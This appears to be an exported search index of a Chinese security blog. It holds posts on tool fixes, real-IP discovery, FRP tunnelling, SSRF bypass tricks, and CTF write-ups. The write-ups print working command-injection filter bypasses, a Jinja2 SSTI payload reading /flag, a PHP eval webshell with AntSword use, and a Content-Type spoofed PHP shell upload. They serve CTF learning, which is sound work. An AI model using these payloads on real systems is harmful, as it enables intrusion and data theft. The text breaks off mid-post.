10\n\n下载最新的releas版4.3.0，（已经是去年10月5号的老代码力），测试的时候反而速度极其须臾（200&#x2F;s左右）\n\n再测试很久很久之前下载的4.2.2版本，也是须臾\n\n这是什么情况？\n稍微在网上搜了搜也没见到有人问相关的问题，去GitHub上看了看issue，在这里发现有人遇到了类似的问题，在其中一个issue里提到，在某个版本更新中，项目合作者删除了一行代码，导致了速率下降和CPU占用高，在这个issue里有人说恢复被删除的代码就好了，而开发者并没有进行回应\n\n去看了看issue里提到的那个commit，确实删除了那一行代码，去掉了一个sleep函数\n\n所以我们只需要改回去应该就好了\n在下载下来的项目文件中：/lib/controller/controller.py在550行左右的代码更改一下:\ndef process(self):    while True:        try:            while not self.fuzzer.is_finished():                if self.is_timed_out():                    raise SkipTargetInterrupt(                        &quot;Runtime exceeded the maximum set by the user&quot;                    )                time.sleep(REFRESH_RATE)  #在这里增加一行代码，其中REFRESH_RATE的值是0.75                #REFRESH_RATE的值是在/lib/core/settings.py中定义的            break        except KeyboardInterrupt:            self.handle_pause()\n\n之后进行测试，即使是clone下来的最新代码，也能跑到最大速度，看了看任务管理器，CPU占用也少了不少\n\n本来想比较一下文件看看问题究竟出在了哪里，结果一对比发现了十万甚至九万个diff，懒得找了，不知道开放人员为何要这样更改，希望之后的稳定版能修复这个bug吧\n","categories":["HackerLearn"],"tags":["Learn","渗透测试","工具"]},{"title":"利用网站证书查找真实IP","url":"/2022/09/05/li-yong-wang-zhan-zheng-shu-cha-zhao-zhen-shi-ip/","content":"利用网站证书查找真实IP​\t\t当需要确定一个网站的真实IP时，往往10个有9个套了CDN而找不到真实IP，而对于一些使用https协议的网站，可以通过分析其SSL证书来定位部分子站点的IP，因为SSL证书一般都是颁发给根域名的，而有的子域名的业务没有套CDN，就可以通过fofa查找证书去尝试找出来真实IP\n用B站举例1.打开控制台，在安全这里可以找到一系列域名的证书\n2.点击查看证书详情，我们需要的是证书的序列号\n3.将16进制的序列号转为10进制\n4.最后在fofa使用语法cert = &quot;27326202010244486292310953776&quot;进行查询，就能找到部分信息\n","categories":["HackerLearn"],"tags":["Web","渗透测试"]},{"title":"内网穿透与FRP初探","url":"/2022/12/09/nei-wang-chuan-tou-yu-frp-chu-tan/","content":"内网穿透与FRP初探内网穿透​       由于疫情被学校遣返回家，不得不收拾东西赶紧离开，而有一些任务还需要在内网里使用，于是就采取了对校内服务器进行一个内网穿透，我的服务器位于一个很复杂的局域网（校园网外加虚拟机）中，我想要实现远程命令和文件访问，必须通过内网穿透将其转发到公网之中，这样就可以在公网访问我的服务器了，想要搞事的话直接ssh连进内网机器就行了\n​      所谓内网穿透，我个人的理解是使用一些工具建立内网机器和一个公网机器的持久性连接，通过这个连接转发相应请求：内网机器部署到x端口上的服务可以转发给公网机器的y端口，而当用户直接去访问这个公网IP的y端口时，就能把这个请求转发给内网机器，并且把内网机器的响应也返回过来，实现了在公网对内网的访问。此外，从公网中访问自己的私有设备向来是一件极其困难的事，自己的电脑、服务器等设备，它们一般处于路由器后，或者运营商因为IP地址短缺不给你分配公网IP地址，一层NAT套一层NAT。如果我们想直接访问到这些设备（远程桌面，远程文件，SSH，WEB服务等），一般也可以通过内网穿透实现。\n​      内网穿透的前提是拥有一个公网IP，而且内网机器可以出网，即可以ping通公网的IP，我的VPS虽然在美国，但是大陆地区可以直连ping通，甚善👍\nFRP使用综合考虑还是使用 frp这个反向代理工具，配合着我的一个有着公网IP的VPS，就能实现公网ssh登录我的校内服务器\nfrp一共有两套，一个是服务端frps，一个是客户端frpc。通过在我的VPS上运行服务端frps，在内网机器上运行客户端frpc，配合各自的配置文件frps.ini和frpc.ini，就能连接，非常的简单，非常的快捷\n下面是两个配置文件\nfrps.ini\n[common]bind_port = 7000  #与客户端绑定的进行通信的端口token = 123456   #连接所需的token\n\nfrpc.ini\n[common]server_addr = VPS的IPserver_port = 7000token = 123456[ssh]type = tcplocal_ip = 127.0.0.1local_port = 22     #绑定的本机x端口remote_port = 5210  #所转发到的y端口\n\n\n\n在vps上执行，创建后台任务，防止关闭ssh连接后进程销毁\nnohup ./frps -c frps.ini &amp;\n\n屏幕输出nohub: ignoring input and appending output to nohub.out说明已经正常运行，可以通过jobs指令查看，此时Ctrl C退出都没事\n在内网机器上执行\n./frpc -c frpc.ini\n\n创不创建后台感觉都行\n这样在连接我的内网服务器时，直接\nssh root@公网IP -p 5210\n\n就可以连接了\n问题1frp工具需要从GitHub上下载，我那个美国VPS可以轻松的\nwget https://github.com/fatedier/frp/releases/download/v0.45.0/frp_0.45.0_linux_amd64.tar.gz\n\n但是我的内网机器由于众所周知的网络原因死活连不上GitHub，wget和git clone是没法使用了\n此外，连接我那个内网机器的终端是一个极其劣质的终端——VMware ESXI的web控制台，没办法复制粘贴，没办法传文件，也没有校园内网的独立IP，怎么把frp客户端文件传上去成了极其困难的问题\n此时忽然想起来内网机子是可以ping通我的VPS的，于是我便在VPS上开启一个server服务，让内网机子从VPS上去下载文件\n使用的命令是\npython3 -m http.server 8000\n\n通过该命令部署了一个简单的文件服务器，直接访问 IP:8000 就能看见文件列表，通过这个方式终于把frp客户端文件传给了内网机器\n\n问题2在尝试连接时发现，ssh报错\nssh: connect to host localhost port 22: Connection refused\n哦原来是没开启ssh服务啊，令人感叹\nssh-keygen -t rsa    #连续按回车，生成秘钥 cat ~/.ssh/id_rsa &gt;&gt; ~/.ssh/authorized_keys  #写入密钥文件sudo apt install openssh-server    #安装openssh-server sudo /etc/init.d/ssh start         #启动openssh-server\n\n能用ssh登录其它主机并不代表着本地主机开启了ssh服务，要安装启动该服务才行，这样就能通过ssh连接本地\n结尾经过测试可以直接在公网连接我的内网服务器了，可以安心的离校了\n此外通过这次灵感突发的尝试，对内网和内网穿透有了些许理解，也许在将来的某次内网渗透中就会用到罢\n","categories":["HackerLearn"],"tags":["Learn","整活","FRP"]},{"title":"SSRF绕过地址限制的一些trick","url":"/2022/10/06/ssrf-rao-guo-di-zhi-xian-zhi-de-yi-xie-trick/","content":"SSRF绕过地址限制的一些trick更改IP地址的表示比如：192.168.0.1可以写为●8进制格式: 0300.0250.0.1●16进制格式: 0xC0.0xA8.0.1●10进制整数格式: 3232235521●16进制整数格式: 0xC0A80001●省略模式，10.0.0.1 &#x3D;&#x3D;&gt; 10.1，192.168.0.1 &#x3D;&#x3D;&gt; 192.168.1\n\n利用URL解析问题在某些情况下，后端程序可能会对访问的URL进行解析,对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当,导致可以绕过过滤。例如:\n1.利用URL解析问题\nhttp://www.baidu.com@192.168.0.1/ 与http://192.168.0.1\n请求的都是192.168.0.1的内容\n2.可以指向任意ip的域名xip.io: http://127.0.0.1.xip.io/ &#x3D;&#x3D;&gt; http://127.0.0.1/\n3.短地址 http://dwz.cn/114514 &#x3D;&#x3D;&gt; http://127.0.0.1\n但是现在短网址转换有很多限制，不建议使用，sad\n4.利用句号。: 127。0。0。1&#x3D;&#x3D;&gt;127.0.0.1\n5.利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  ==&gt; example.com① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿","categories":["HackerLearn"],"tags":["Web","SSRF"]},{"title":"使用Gitee和PicGo搭建个人图床","url":"/2021/10/13/shi-yong-gitee-he-picgo-da-jian-ge-ren-tu-chuang/","content":"使用Gitee和PicGo搭建个人图床22年补充说明，Gitee图床已经寄了，最后还是用了阿里云的OSS，sad\n在之前的markdown文件里，加载图片使用的外链都是使用的图床网站路过图床。但是在搭建博客的时候发现了一个严峻的问题，我上传的用于背景的二次元图片全被删除，原来是违反了图床规定：\n\n在网上找了其他图床之后，发现也有类似的条款。为了实现Blog二刺螈化，还是搭建一个个人图床比较稳妥\n步骤首先是在Gitee上面创建一个仓库，作为储存图片的仓库\n\n点击我 -&gt; 设置 -&gt; 私人令牌（token）  \n注意这个令牌只会显示一次，需要及时复制下来，这里我已经加好了私人令牌，如果忘记了token，可以重新生成\n\n然后是神奇的软件PicGo，下载插件gitee-uploader和github-plus，然后在图床设置里面配置仓库路径，分支和token，注意在仓库栏填写的是仓库的URL\n\n然后就能利用Gitee实现自己的图床了。顺便还可以使用一些网站将图像压缩，提高外链加载速度。\n为什么不在Github搭建图床？1.占用Github资源，为什么不白嫖Gitee呢（\n2.在墙内访问速度快很多\n3.PicGo每次上传图片都相当于一次git提交，上传了一堆图片导致Github全绿，这个是否有点…..\n\n","categories":["Deployment"],"tags":["Learn","摆烂了","Blog"]},{"title":"Hello Hexo","url":"/2023/04/22/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you https://hexo.io/docs/one-command-deployment.html)\n在今天把博客迁移到了经典工具Hexo上，并且用上了舟舟主题\n之前没有使用Hexo是因为玩不明白Git和Hexo以及node npm这些东西，时隔多年，今天偶然碰见了这个主题，开服老粥批立马决定换上这个，于是便有了这个全新的界面🥰🥰🥰\n摸索了一天，收获颇丰\n","categories":["Deployment"],"tags":["Learn","Blog"]},{"title":"如何PWN掉一个卡西欧计算器","url":"/2021/10/14/ru-he-pwn-diao-yi-ge-qia-xi-ou-ji-suan-qi/","content":"如何PWN掉一个卡西欧计算器在高中时期参加过物理竞赛，获得了一个超级计算器CASIO fx991 CNX，此计算器陪我征战几年如今已经战痕累累，这几天突然想起来高中时期在贴吧听说过CASIO的一些神奇操作。当时啥也不会狗屁不懂，如今会了些许代码之后突然想起来这事，于是便打算对CASIO一探究竟。\nCASIO字符转换器的原理：常规的非正常操作是字符转换，用卡西欧输出一些诸如“I love you”之类的字符串，卡西欧中所有字符都是以一个或两个字节储存的，比如单字节的31对应数字1，77对应sin，7D对应log，23对应冒号，等等；常数和单位转换都是双字节的，其中常数（在卡西欧内部，Ran#也被视为常数）的第一个字节都是FD，单位转换的第一个字节都是FE，赋值操作的第一个字节都是FB。卡西欧的算式是由大量字节构成的，计算器会从左到右读取字节，如果遇到FD，FE或FB这些特殊字节，就会和下一个字节拼成一个字符。而bug在于：lbf&#x2F;in2→kpa对应的存储值为FE23，而23正好是冒号。用卡西欧比较多的人应该都知道，如果一个算式中有冒号，我们查看历史记录时，冒号及冒号右边的部分是不显示的。于是，23字节被删除，本来不可能单独出现的FE字节就出现在了算式的最右侧。此时在FE字节的后面添加东西就可以弄出一些非法字符，比如在FE的后面加上一个Ran#（对应FD18），计算器就会把FE和FD拼在一起构成那个t开头E结尾的乱码，剩下的单字节18构成非法字符@。构造出漏洞之后便可以间接对内存进行操作，轻者输出特定字符，重者直接死机。\n漏洞复现payload（大概）\n\n上图就是传说中的”hack代码”，在CASIO fx991上面按照从左到右从上到下的顺序输入之后，整个计算器就会强制关机并且无法正常启动，只有打开后盖重新安装电池才能再次启动，杀伤力不容小觑，是否对计算器有永久伤害未知。\nbug触发第一行的操作是使用lbf&#x2F;in2→kpa来构造漏洞基础\n在执行到第二行的   SHIFT  .    之后，屏幕上已经出现了乱码，如图所示，此时已经可以通过按键来对内存进行修改操作\n\n执行完上述操作后，我的计算器成功死机，但是螺丝刀不在身旁没法拆后盖，悲\n\n结语最后贴个远古巨坟，这里面是贴吧大佬整理的关于卡西欧系列计算器的种种研究发现，感谢这些致力于研究卡西欧计算器的前辈们，这种只为兴趣不图名利的精神让人怀念，感慨那个“过去的好时代”。同样也以此博客纪念一下我那一事无成的物理竞赛生涯，那是我高中时期最快乐也是最充满激情的时期，如今早已物是人非，没了当年的干劲和热情。\n无论是谁访问了这个博文，祝你今天有个好心情，也祝你永远忠于热爱。\n","categories":["HackerLearn"],"tags":["整活","PWN"]},{"title":"XJU1024CTF总结","url":"/2021/10/28/xju1024ctf-zong-jie/","content":"XJUSEC总结前几天在机缘巧合下参加了新疆大学的新生赛，题目不算难，但是有一些没了解过的新东西，导致没有AK，于是用这个记录一下新学到的知识\nCrypto1.垃圾邮件这是唯一一个没写出来的密码题，题目给了一个垃圾邮件，里面的关键内容是一个用作密码的txt，藏flag的word，看了官方题解才知道这个是垃圾邮件密码，将信息藏到一段文字之中。解密的网站在这里 \n这个网站可以对一些空格，垃圾文本进行加密解密，首先用txt的空格解出密码，然后把word的文章复制上去解出来flag。\n评价：很容易误解为white space 隐写，几乎是唯一解，而且相对冷门。\n2.日历密码之前听说过，这次也是第一次见，题目特征非常明显，一张日历截图和类似这样的密文\nS21 F1 T12 T11 T22 M1 F1 M3\n\n其中M T1 W T2 F S1 S2 对应周一到周日，后面的数字是第几天，然后将日期与26个字母表对照即可\n3.标准银河密码题目给了一张MC的附魔台的截图，稍有常识的人就能看出来MC使用的是标准银河密码，与之对照即可\n4.ROT全家桶之前使用的大多是ROT13，这次也了解到了还有ROT5  ROT18  ROT47\n贴个在线网站\nMisc1.按键音破解在某一题中用到了，之前下载软件时里面装了一个按键音破解，这次派上用场了\n2.修改文件头这题没写出来是我想复杂了，一眼看出来zip的文件头不对，但是误以为是删除了文件头，需要通过文件尾（504B0102）字段倒推出来文件头(504B0304)字段再加到前面，结果是修改了文件头233333\n3.excelexcel和word文档的本质都是压缩包，将其改名解压后直接在XML中Ctrl F 搜索就能找到flag\n4.macro  mrf文件这次第一次见到了鼠标宏文件，记录鼠标的轨迹，比如画出flag，安装相关软件就能复现鼠标轨迹看到flag\n5杂题另外几道没写出来的题都是想复杂了，一个是在图片的16进制格式中直接查找flag，以为是什么高级隐写：数字水印，双图嵌套，缩略图隐写，高度宽度等qwq，还有一个是在流量包中分离出Base64格式的图片，将其修改高度就行，找到图片之后没想到。\n顺便贴个好玩的网站\nWeb1.rce漏洞给出的题目如下所示\n&lt;?php$rce = $_GET[&#x27;rce&#x27;];if (isset($rce)) &#123;    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\&gt;|\\&lt;|\\&#x27;|\\&quot;/i&quot;, $rce)) &#123;        system($rce);    &#125;else &#123;        echo &quot;hhhhhhacker!!!&quot;.&quot;\\n&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n读文件的命令\nmore:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261 //报错出文件内容\n\n空格被过滤\n&lt; 、&lt;&gt;、%09(tab键)、%20、$IFS$9、$IFS$1、$&#123;IFS&#125;、$IFS等，还可以用&#123;&#125; 比如 &#123;cat,flag&#125;\n\n关键字绕过\n1.利用转义符号： 将flag写为/fl\\ag，但很多情况下都没有用2.拼接法：a=fl;b=ag;cat$IFS$a$b ，但这里过滤了cat和；所以不适用3.使用空变量$*和$@，$x,$&#123;x&#125;绕过 题目中并没有过滤$和@尝试发现得出flag\n\n可以看出题目是将一些常见的读取命令给过滤掉，同时还过滤了空格和flag，所以最后的payload是\nrce=uniq$&#123;IFS&#125;fl$@ag.php\n\n2.php数组溢出这一题其他的内容就不贴出来了，是一些常规的md5绕过和反序列化绕过_wakeup，其中我第一次见到的是下面这个（可见我的孤陋寡闻）\nif ($array[$d--] = 1) &#123;            if ($array[] = 1) &#123;                echo &#x27;wrong&#x27;;            &#125; else &#123;                unserialize($_POST[&#x27;flag&#x27;]);            &#125;        &#125;\n\n这个用到了PHP数组key溢出：PHP的int型数据取值范围，与操作系统相关，32位系统上为2的31次⽅，即-2147483648到2147483647， 64位系统上为2的63次⽅，即-9223372036854775808到9223372036854775807。\n当数组下标达到了9223372036854775807，这个时候想要再往⾥⾯插⼊元素，就会报错，var_dump之后 返回⼀个NULL，就能绕过这个判断\n3.SSTI最简单的SSTI模板题，使用的是官方给的漏洞复现就能找到flag\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;) &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n之前常见的一些题目都是PHP这个“漏洞百出“的语言，而且漏洞差不多已经被开发完毕了（，之后会有更多的Java web，flask，node.js这种web题，还需要不断学习\nRE1.8086见识到了富有年代感的16位程序，这个需要在IDA中查看汇编代码，通过读汇编可以看出是对已经储存的字符异或1F，用脚本可以须臾解出。\n2.数织逆向的核心就是读伪代码&#x2F;汇编来明白程序要干什么，之前的一道题是前20行的杨辉三角，那个模型还是比较熟悉的（C语言第一课了属于是），看了官方题解才知道这一题的核心是数织游戏的规则,读出大致的数织图形就能找到flag，虽然之前看沃玛在微博发过她自制的数织游戏，但没想到能出道RE题里orz\nOsint情报社工题\n1.航班土狗没坐过飞机，不知道有可以查历史航班的免费软件 ——飞常准，是我孤陋寡闻了。\n2.音频倒放稍有常识的人就能准确地听出来音频是倒放还是正放（\n总结求知若渴 虚心若愚\n（还有不要想太多🤡🤡🤡🤡🤡）\n","categories":["WriteUp"],"tags":["Learn","CTF","PHP"]},{"title":"UNCTF做题记录","url":"/2022/11/22/unctf-zuo-ti-ji-lu/","content":"UNCTF做题记录UNCTF2022的做题记录以及赛后复现，本次比赛的题目质量挺好的，很符合我对CTF的想象，有趣并带着坐牢\n总结写到前面：UNCTF的题目质量挺高的，但是因为这几天忙着考试，比赛 根本没多少时间打，没有时间进前20拿到奖品属实算是莫大的遗憾，但还是学到不少东西\n——“当你完成某事总是‘差一点’时，你需要的就是‘差一点’的那个经验”\n比赛平台暂时没办法新建容器，凭记忆复现一下吧\n[TOC]\nWEB签到点进去发现是个登录框，F12看到学号密码，根据学号点击发现登录成功\n错误思路：\n以为是POST类型的SQL盲注，打了一年换用各种payload都不行，遂放弃\n正确思路：\n将学号+1，输入后发现出来了回显&quot;f&quot;，这就是flag，在burp里逐步累加爆破即可\nBILIBILI大学进去就是phpinfo，Ctrl F 直接搜到flag，在环境变量里\n\nBILIBILI大学修复版flag被修复，在phpinfo里搜索hint发现一个YWRtaW5fdW5jdGYucGhw,base64解码后是admin_unctf.php\n访问后发现是一个登录界面，在请求中抓包可以看见hint_2:dW5jdGYyMDIyL3VuY3RmMjAyMg==,解码后是unctf2022&#x2F;unctf2022即账号密码\n登录之后之后界面给了源码\n&lt;?phpputenv(&quot;FLAG=nonono&quot;);if(!isset($_POST[&#x27;username&#x27;]) &amp;&amp; !isset($_POST[&#x27;password&#x27;]))&#123;    exit(&quot;username or password is empty&quot;);&#125;else&#123;    if($_POST[&#x27;username&#x27;] === &quot;unctf2022&quot; &amp;&amp; $_POST[&#x27;password&#x27;] === &quot;unctf2022&quot;)&#123;        show_source(__FILE__);        @system(&quot;ping &quot;.$_COOKIE[&#x27;cmd&#x27;]);    &#125;else&#123;        exit(&quot;username or password error&quot;);    &#125;&#125;\n\n一眼命令注入，抓包，在请求包里加上\nCookie: cmd=114.114.114.114|cat /flag\n\n得到base64编码，解码后是一个B站小号的主页，个人简介那里得到flag\nezgame点进去发现是个游戏，想都不想直接开始扒源码，在main.js里发现\nthis.rCanv.addEventListener(&#x27;animationend&#x27;, (() =&gt;&#123;            this.isDead = this.rStats.life &lt;= 0,            //这里是判断胜利的代码            this.isDead ? (function()&#123;function _0x1a71(_0x576391,_0x47cdf6)&#123;var _0x33c239=_0x3005();return _0x1a71=function(_0x18fbb7,_0x4f7b9f)&#123;_0x18fbb7=_0x18fbb7-(-0x40*0x85+-0x9dc*0x3+0x658*0xa);var _0x5a7e37=_0x33c239[_0x18fbb7];return _0x5a7e37;&#125;,_0x1a71(_0x576391,_0x47cdf6);&#125;function _0x3005()&#123;var _0x313bce=[&#x27;86VkibmA&#x27;,&#x27;fe7b163f8d&#x27;,&#x27;6833565vBFVDj&#x27;,&#x27;23742ODGjjF&#x27;,&#x27;unctf&#123;c5f9&#x27;,&#x27;d3&#125;&#x27;,&#x27;1335DfKYdi&#x27;,&#x27;6442920PCnqhb&#x27;,&#x27;781140poNcpx&#x27;,&#x27;a27d-6f88-&#x27;,&#x27;795305dViflS&#x27;,&#x27;1569524rbiRmt&#x27;,&#x27;49fb-a510-&#x27;,&#x27;88IpXszc&#x27;,&#x27;13033ieCwIU&#x27;,&#x27;6GgaKPA&#x27;];_0x3005=function()&#123;return _0x313bce;&#125;;return _0x3005();&#125;var _0x57214f=_0x1a71;(function(_0x5f4f7e,_0x564c49)&#123;var _0x5561c3=_0x1a71,_0x56ec78=_0x5f4f7e();while(!![])&#123;try&#123;var _0xe4411f=-parseInt(_0x5561c3(0xa5))/(-0x2369+-0x618*0x4+0x3bca)*(parseInt(_0x5561c3(0xa7))/(0xac1+-0x3*0x881+-0x1*-0xec4))+parseInt(_0x5561c3(0xa6))/(0x24c5+0x783+-0x2c45)*(parseInt(_0x5561c3(0xa2))/(-0xe2e+-0x1c7d+0x2aaf))+-parseInt(_0x5561c3(0x9d))/(-0x1870+-0x1*-0x1dbd+-0x548)*(-parseInt(_0x5561c3(0xaa))/(-0x9*-0x287+0x5*-0x165+-0x2a0*0x6))+-parseInt(_0x5561c3(0xa1))/(0x4*0x9a3+-0x7*0x1d2+-0x19c7)+parseInt(_0x5561c3(0x9e))/(-0x27b+-0x206*-0x6+-0x9a1)+-parseInt(_0x5561c3(0xa9))/(0x66b+0xa39+-0x109b*0x1)+parseInt(_0x5561c3(0x9f))/(-0x8ba+0x1f1*0x10+0xb26*-0x2)*(-parseInt(_0x5561c3(0xa4))/(0x2548+0x1e3+-0x2720));if(_0xe4411f===_0x564c49)break;else _0x56ec78[&#x27;push&#x27;](_0x56ec78[&#x27;shift&#x27;]());&#125;catch(_0x1ed64e)&#123;_0x56ec78[&#x27;push&#x27;](_0x56ec78[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x3005,-0x909e0+0x62296*0x2+0x5bf33),alert(_0x57214f(0xab)+_0x57214f(0xa0)+_0x57214f(0xa3)+_0x57214f(0xa8)+_0x57214f(0x9c)));&#125;)() : &quot;&quot;,            this.isDead ? this.reaperCont.innerHTML = &#x27;&#x27; : (this.rCanv.style.animation = &#x27;reaperAnim 6s infinite ease-in-out&#x27;, this.draw())          &#125;)),    //需要执行的部分    function _0x1a71(_0x576391,_0x47cdf6)&#123;var _0x33c239=_0x3005();return _0x1a71=function(_0x18fbb7,_0x4f7b9f)&#123;_0x18fbb7=_0x18fbb7-(-0x40*0x85+-0x9dc*0x3+0x658*0xa);var _0x5a7e37=_0x33c239[_0x18fbb7];return _0x5a7e37;&#125;,_0x1a71(_0x576391,_0x47cdf6);&#125;function _0x3005()&#123;var _0x313bce=[&#x27;86VkibmA&#x27;,&#x27;fe7b163f8d&#x27;,&#x27;6833565vBFVDj&#x27;,&#x27;23742ODGjjF&#x27;,&#x27;unctf&#123;c5f9&#x27;,&#x27;d3&#125;&#x27;,&#x27;1335DfKYdi&#x27;,&#x27;6442920PCnqhb&#x27;,&#x27;781140poNcpx&#x27;,&#x27;a27d-6f88-&#x27;,&#x27;795305dViflS&#x27;,&#x27;1569524rbiRmt&#x27;,&#x27;49fb-a510-&#x27;,&#x27;88IpXszc&#x27;,&#x27;13033ieCwIU&#x27;,&#x27;6GgaKPA&#x27;];_0x3005=function()&#123;return _0x313bce;&#125;;return _0x3005();&#125;var _0x57214f=_0x1a71;(function(_0x5f4f7e,_0x564c49)&#123;var _0x5561c3=_0x1a71,_0x56ec78=_0x5f4f7e();while(!![])&#123;try&#123;var _0xe4411f=-parseInt(_0x5561c3(0xa5))/(-0x2369+-0x618*0x4+0x3bca)*(parseInt(_0x5561c3(0xa7))/(0xac1+-0x3*0x881+-0x1*-0xec4))+parseInt(_0x5561c3(0xa6))/(0x24c5+0x783+-0x2c45)*(parseInt(_0x5561c3(0xa2))/(-0xe2e+-0x1c7d+0x2aaf))+-parseInt(_0x5561c3(0x9d))/(-0x1870+-0x1*-0x1dbd+-0x548)*(-parseInt(_0x5561c3(0xaa))/(-0x9*-0x287+0x5*-0x165+-0x2a0*0x6))+-parseInt(_0x5561c3(0xa1))/(0x4*0x9a3+-0x7*0x1d2+-0x19c7)+parseInt(_0x5561c3(0x9e))/(-0x27b+-0x206*-0x6+-0x9a1)+-parseInt(_0x5561c3(0xa9))/(0x66b+0xa39+-0x109b*0x1)+parseInt(_0x5561c3(0x9f))/(-0x8ba+0x1f1*0x10+0xb26*-0x2)*(-parseInt(_0x5561c3(0xa4))/(0x2548+0x1e3+-0x2720));if(_0xe4411f===_0x564c49)break;else _0x56ec78[&#x27;push&#x27;](_0x56ec78[&#x27;shift&#x27;]());&#125;catch(_0x1ed64e)&#123;_0x56ec78[&#x27;push&#x27;](_0x56ec78[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x3005,-0x909e0+0x62296*0x2+0x5bf33),alert(_0x57214f(0xab)+_0x57214f(0xa0)+_0x57214f(0xa3)+_0x57214f(0xa8)+_0x57214f(0x9c)));\n\n直接控制台执行，弹出flag\nbabyPHP打开后是服务器欢迎界面，稍有常识都知道要访问index.php\n&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_POST[&quot;a&quot;]))&#123;    if($_POST[&quot;a&quot;]==0&amp;&amp;$_POST[&quot;a&quot;]!==0)&#123;        if(isset($_POST[&quot;key1&quot;])&amp;isset($_POST[&quot;key2&quot;]))&#123;            $key1=$_POST[&quot;key1&quot;];            $key2=$_POST[&quot;key2&quot;];            if ($key1!==$key2&amp;&amp;sha1($key1)==sha1($key2))&#123;                if (isset($_GET[&quot;code&quot;]))&#123;                    $code=$_GET[&quot;code&quot;];                    if(!preg_match(&quot;/flag|system|txt|cat|tac|sort|shell|\\.| |\\&#x27;/i&quot;, $code))&#123;                        eval($code);                    &#125;else&#123;                        echo &quot;有手就行&lt;/br&gt;&quot;;                    &#125;                &#125;else&#123;                    echo &quot;老套路了&lt;/br&gt;&quot;;                &#125;            &#125;else&#123;                echo &quot;很简单的，很快就拿flag了~_~&lt;/br&gt;&quot;;            &#125;        &#125;else&#123;            echo &quot;百度就能搜到的东西&lt;/br&gt;&quot;;        &#125;    &#125;else&#123;        echo &quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;/br&gt;&quot;;    &#125;&#125;\n\n很经典的弱类型绕过，直接贴payload吧\n蚁剑链接，密码 x \n/index.php?code=eval($_POST[x]);post传参:a=0a&amp;key1[]=1&amp;key2[]=2\n\n在根目录下有flag.txt\neasy_upload打开之后是一个经典文件上传，对上传文件有过滤\n错误操作：\n在上传时把文件格式改成jpeg 了，结果虽然能上传成功，但是不会被解析执行，上传的pthml也不行，看到有个“文件临时储存在&#x2F;tmp&#x2F;xxxxxx”，还以为是条件竞争，最后还是我想多了\n正确操作：直接传个shell.php，改成Content-type: image/png，蚁剑直接连接，找半天在&#x2F;home&#x2F;ctf&#x2F;flag下面有flag\n顺便在网站目录下发现了index.php还有网站备份啥的，没用上\n给你一刀一看是thinkPHP框架，直接上工具一把梭，众所周知在渗透测试中测试RCE常用的就是phpinfo，所以在phpinfo里面可以直接搜到flag\n302与深大302跳转，burp慢慢抓包放包可以操作，按照要求传参就行，最后注意的有个“Cookie伪造”是设置admin&#x3D;true\nPOST /index.php?miku=puppy HTTP/1.1Host: cb5adaa6-398a-4a8e-802a-cd806681db0b.node.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36Cookie:admin=true;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 10micgo=ikun\n\n相应的是flag的前半部分和phpinfo，可以找到flag的后半部分\neasy 